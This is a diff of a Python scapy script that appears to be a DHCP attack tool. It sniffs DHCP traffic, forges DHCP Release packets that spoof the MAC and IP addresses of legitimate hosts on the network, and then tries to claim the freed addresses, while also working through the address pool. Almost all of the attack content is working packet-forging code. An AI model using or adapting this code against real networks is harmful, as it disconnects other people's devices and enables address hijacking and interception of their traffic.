@@ -253,13 +253,10 @@ def send_renewal_request(host, interface):
     #scapy.sendp(dhcp_request, verbose=False, iface=iface)
 
 
-def send_release(mac_address, interface):
+def send_release(mac_address, ip_address):
     """
     Send DHCP Release
     """
-    # Finding the fake host's IP address to release
-    host_ip = fake_host_dict[mac_address].ip_address
-    hostname = fake_host_dict[mac_address].hostname
     # Getting a random Trans ID
     trans_id = get_transaction_id()
     # Converting MAC addresses
@@ -268,7 +265,7 @@ def send_release(mac_address, interface):
     # Making DHCP Release packet
     ether_header = scapy.Ether(src=mac_address, 
                                dst=server_mac)
-    ip_header = scapy.IP(src=host_ip, 
+    ip_header = scapy.IP(src=ip_address, 
                          dst=dhcp_server_ip)
     udp_header = scapy.UDP(sport=68, 
                            dport=67)
@@ -277,13 +274,12 @@ def send_release(mac_address, interface):
                               flags=0)
     dhcp_field = scapy.DHCP(options=[("message-type", "release"),
                                      ("server_id", dhcp_server_ip),
-                                     #("hostname", hostname), 
                                      "end"])
     dhcp_request = (ether_header/ip_header/udp_header/bootp_field/dhcp_field)
 
-    scapy.sendp(dhcp_request, verbose=False, iface=interface)
-    #scapy.sendp(dhcp_request, verbose=False, iface=iface)
-    write_to_log(f"Releasing IP address {host_ip}")
+    #scapy.sendp(dhcp_request, verbose=False, iface=interface)
+    scapy.sendp(dhcp_request, verbose=False, iface=iface)
+    write_to_log(f"Releasing IP address {ip_address} from {mac_address}")
 
 
 def send_release_v2(mac_address, ip_address, hostname):
@@ -381,7 +377,7 @@ def handle_dhcp_packet(packet):
             # Adding existing host to diccionary
             existing_host_dict[client_mac] = host
             # Sending DHCP Release
-            send_release_v2(host.mac_address, host.ip_address, host.hostname)
+            send_release(host.mac_address, host.ip_address)
 
             # Now we try to get the recently released IP address
             time.sleep(5)
@@ -597,6 +593,7 @@ def release_and_request():
     '''
     None
 
+
 def main():
     global iface
     iface = "eth0"
@@ -618,10 +615,6 @@ def main():
     # Starting asynchronous DHCP packet sniffer
     dhcp_sniffer = scapy.AsyncSniffer(filter="udp and (port 67 or 68)", prn=handle_dhcp_packet)
     dhcp_sniffer.start()
-
-    # Starting asynchronous ARP packet sniffer
-    #arp_sniffer = scapy.AsyncSniffer(filter="arp", prn=handle_arp_packet)
-    #arp_sniffer.start()
 
     # Getting all avalaible IP from network
     delay_between_discovers = 0.1 # seconds
